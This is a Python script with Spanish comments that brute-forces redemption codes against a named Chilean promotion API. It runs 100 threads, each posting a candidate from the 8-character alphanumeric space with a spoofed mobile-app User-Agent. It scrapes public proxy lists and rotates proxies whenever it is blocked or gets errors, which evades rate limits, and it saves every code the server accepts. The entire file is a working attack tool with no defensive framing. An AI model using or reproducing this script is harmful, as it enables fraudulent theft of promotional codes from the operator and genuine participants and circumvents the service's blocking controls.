#!/usr/bin/python
import threading
import requests
import itertools
from StringIO import StringIO
import lxml.etree
import time

# configuracion
token = 'token'
max_thread = 100
max_incidencia = 30

lock = threading.Semaphore(max_thread)

output = ''
proxy_list = []
proxy = ''
offset = 0
incidencia = 0

def cambiar_proxy(proxy_list):
	global proxy
	global offset
	global incidencia

	incidencia = 0

	print '[*] Cambiando proxy...'

	offset+=1

	if(offset >= len(proxy_list)):
		cargar_proxys(proxy_list)
		offset = 0

	proxy = proxy_list[offset]
	print '[*] Proxy: ' + proxy

def parse(i):
	global proxy
	global output
	global incidencia
	global max_incidencia

	proxy_thread = proxy

	if(incidencia > max_incidencia and proxy_thread == proxy):
		cambiar_proxy(proxy_list)

	print '[*] Probando combinacion: ', i

	try:
		r = requests.post('https://lataconplata.cl/api/codes',
			headers={'User-Agent':'Becker-LataConPlata/1.03 (com.becker.lcp; build:12; iOS 11.2.6) Alamofire/4.5.1)','Connection':'close','token':token},
			proxies = {'http':proxy_thread},
			data={'code':i},
			timeout=(5.5, 10))

	except Exception as e:
			print '[*] Error en la conexion'
			print '[*] Intentando nuevamente'
			incidencia+=1
			parse(i)
			exit()

	if 'Usuario no v\u00e1lido' in r.text:
		print '[*] Usuario NO validado'
		print '[*] Intentando nuevamente'
		parse(i)
		exit()
	
	elif '503 Service Temporarily Unavailable' in r.text:
		print '[*] Servicio no disponible'
		print '[*] Intentando nuevamente'
		parse(i)
		exit()

	elif 'C\u00f3digo incorrecto' not in r.text and r.status_code == 200 and r.text != '':
		print '[*] Codigo: \'' + i + '\' valido encontrado :}'
		output += i + '\n'
		if(incidencia != 0):
			incidencia = 0

	elif 'C\u00f3digo incorrecto' in r.text:
		print '[*] Codigo: \'' + i + '\' incorrecto o usado'
		if(incidencia != 0):
			incidencia = 0

	elif '403 Forbidden' in r.text:
		print '[*] 403 Forbidden'
		if(proxy_thread == proxy):
			cambiar_proxy(proxy_list)
		parse(i)
		exit()

	else:
		print '[*] Respuesta desconocida'
		print '[*] Intentando nuevamente'
		incidencia+=1
		parse(i)
		exit()

	lock.release()

def cargar_proxys(proxy_list):
	del proxy_list[:]

	print '[*] Cargando lista de proxys...'

	# carga lista de proxy's https://www.proxydocker.com (IP de Chile)
	for p in range(7):

		response = requests.get("https://www.proxydocker.com/es/proxylist/search?port=All&type=HTTP&anonymity=All&country=Chile&city=All&state=All&need=All&page=" + str(p+1))

		tree = lxml.etree.parse(StringIO(response.content), lxml.etree.HTMLParser())
		root = tree.getroot()
		td_tbody = root.xpath('//td//a/@href')

		for x in td_tbody:
			if '/es/proxy/' in x:
				line = x.replace('/es/proxy/', '')
				proxy_list.append(line)

	# carga lista de proxy's https://www.sslproxies.org
	response = requests.get("https://www.sslproxies.org")

	tree = lxml.etree.parse(StringIO(response.content), lxml.etree.HTMLParser())
	root = tree.getroot()
	td_tbody = root.xpath('//tbody//tr//td/text()')

	count = 0
	line = ""

	for x in td_tbody:
		count = count + 1

		if(count == 1):
			line += x

		elif(count == 2):
			line += ":" + x

		elif(count == 8):
			proxy_list.append(line)
			count = 0
			line = ""

	# carga lista de proxy's https://www.us-proxy.org
	response = requests.get("https://www.us-proxy.org")

	tree = lxml.etree.parse(StringIO(response.content), lxml.etree.HTMLParser())
	root = tree.getroot()
	td_tbody = root.xpath('//tbody//tr//td/text()')

	count = 0
	line = ""

	for x in td_tbody:
		count = count + 1

		if(count == 1):
			line += x

		elif(count == 2):
			line += ":" + x

		elif(count == 8):
			proxy_list.append(line)
			count = 0
			line = ""

start_time = time.time()
cargar_proxys(proxy_list)
proxy = proxy_list[offset]

res = itertools.product('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ', repeat=8)

thread_pool = []

for i in res:
	con_lst = ''.join(i)

	thread = threading.Thread(target=parse, args=(con_lst,))
	thread_pool.append(thread)
	thread.start()

	lock.acquire()

for thread in thread_pool:
	thread.join()

file = open('codigos','w+')
file.write(output);
file.close()

print '[*] Script finalizado'
print '[*] Tiempo total: ' + str(round((time.time() - start_time),2)) + ' segundos'
